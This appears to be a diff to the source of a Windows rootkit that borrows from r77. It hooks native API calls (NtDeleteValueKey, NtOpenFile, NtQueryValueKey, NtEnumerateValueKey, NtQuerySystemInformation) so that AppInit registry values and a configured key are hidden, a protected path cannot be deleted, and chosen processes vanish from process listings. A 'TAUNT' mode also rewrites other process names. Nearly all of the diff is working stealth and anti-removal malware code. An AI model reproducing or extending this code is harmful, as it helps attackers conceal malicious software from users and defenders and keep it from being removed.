@@ -5,8 +5,7 @@ NTSTATUS WINAPI HookedNtDeleteValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueNa
     if (ValueName->Length > 3)
     {
         std::wstring w_name = std::wstring(ValueName->Buffer);
-        // std::transform(w_name.begin(), w_name.end(), ::tolower);
-        if (CheckExists(w_name, L"appinit", false) || CheckExists(w_name, KEY, false))
+        if (CheckExists(w_name, APPINIT, false) || CheckExists(w_name, KEY, false))
             return STATUS_OBJECT_NAME_NOT_FOUND;
     }
 
@@ -18,8 +17,7 @@ NTSTATUS WINAPI HookedNtDeleteValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueNa
 //     if (ValueName->Length > 3)
 //     {
 //         std::wstring w_name = std::wstring(ValueName->Buffer);
-//         // std::transform(w_name.begin(), w_name.end(), ::tolower);
-//         if (CheckExists(w_name, L"AppInit", false) || CheckExists(w_name, KEY, false)) 
+//         if (CheckExists(w_name, APPINIT, false) || CheckExists(w_name, KEY, false)) 
 //             return STATUS_ACCESS_DENIED;
 //     }
 
@@ -28,11 +26,10 @@ NTSTATUS WINAPI HookedNtDeleteValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueNa
 
 NTSTATUS WINAPI HookedNtOpenFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions)
 {
-    if (DesiredAccess & DELETE && ObjectAttributes->ObjectName->Length > 1)
+    if (DesiredAccess & DELETE && ObjectAttributes->ObjectName->Length > 3)
     {
-        std::wstring w_name = std::wstring(ObjectAttributes->ObjectName->Buffer);
-        // std::transform(w_name.begin(), w_name.end(), ::tolower);
-        if (CheckExists(w_name, PATH, false))
+        OutputDebugStringW(ObjectAttributes->ObjectName->Buffer);
+        if (CheckExists(std::wstring(ObjectAttributes->ObjectName->Buffer), PATH, false))
             return STATUS_ACCESS_DENIED;
     }
 
@@ -44,13 +41,13 @@ NTSTATUS WINAPI HookedNtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueNam
     if (ValueName->Length > 3)
     {
         std::wstring w_name = std::wstring(ValueName->Buffer);
-        // std::transform(w_name.begin(), w_name.end(), ::tolower);
-        if (CheckExists(w_name, L"appinit", false) || CheckExists(w_name, KEY, false))
+        if (CheckExists(w_name, APPINIT, false) || CheckExists(w_name, KEY, false))
             return STATUS_OBJECT_NAME_NOT_FOUND;
     }
     return OriginalNtQueryValueKey(KeyHandle, ValueName, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
 }
 
+// pulled from r77 rootkit - ty
 NTSTATUS WINAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_INFORMATION_CLASS keyValueInformationClass, LPVOID keyValueInformation, ULONG keyValueInformationLength, PULONG resultLength)
 {
     NTSTATUS status = OriginalNtEnumerateValueKey(key, index, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
@@ -62,9 +59,7 @@ NTSTATUS WINAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_
             status = OriginalNtEnumerateValueKey(key, i, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
 
             std::wstring w_name = std::wstring(KeyValueInformationGetName(keyValueInformation, keyValueInformationClass));
-            // std::transform(w_name.begin(), w_name.end(), ::tolower);
-            // if (name.find(L"AppInit") == std::wstring::npos && name.find(L"KsGuard") == std::wstring::npos)
-            if (CheckExists(w_name, L"appinit", true) && CheckExists(w_name, KEY, true))
+            if (CheckExists(w_name, APPINIT, true) && CheckExists(w_name, KEY, true))
                 newIndex++;
         }
     }
@@ -91,8 +86,7 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemIn
 
         while (prev->NextEntryOffset != 0)
         {
-            std::wstring w_name = std::wstring(curr->ImageName.Buffer);
-            if (CheckExists(w_name, PROCESS, false))
+            if (CheckExists(std::wstring(curr->ImageName.Buffer), PROCESS, false))
             {
                 if (curr->NextEntryOffset == 0)
                     prev->NextEntryOffset = 0;
@@ -102,7 +96,7 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemIn
             }
             else if (TAUNT)
             {
-                WriteProcessMemory(GetCurrentProcess(), curr->ImageName.Buffer, L"kingsguard", curr->ImageName.Length, NULL);
+                WriteProcessMemory(GetCurrentProcess(), curr->ImageName.Buffer, DLL, curr->ImageName.Length, NULL);
             }
             prev = curr;
             curr = PMY_SYSTEM_PROCESS_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
